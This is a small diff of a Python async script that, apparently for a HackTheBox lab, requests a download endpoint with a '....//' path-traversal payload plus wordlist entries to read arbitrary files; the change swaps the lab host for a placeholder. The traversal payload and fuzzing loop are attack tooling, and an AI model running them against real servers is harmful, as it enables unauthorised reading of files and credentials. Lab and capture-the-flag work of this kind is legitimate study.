@@ -32,7 +32,7 @@ with open(wordlist_path, mode="r") as file:
 wordsToCheck = len(words)
 
 async def fetch(session, word):
-    url = f"http://snoopy.htb/download?file=....//....//....//....//....//....//....//{word}"
+    url = f"http://LINK/download?file=....//....//....//....//....//....//....//{word}"
     async with session.get(url) as response:
         if not response.content_length or response.content_length == 0:
             return None
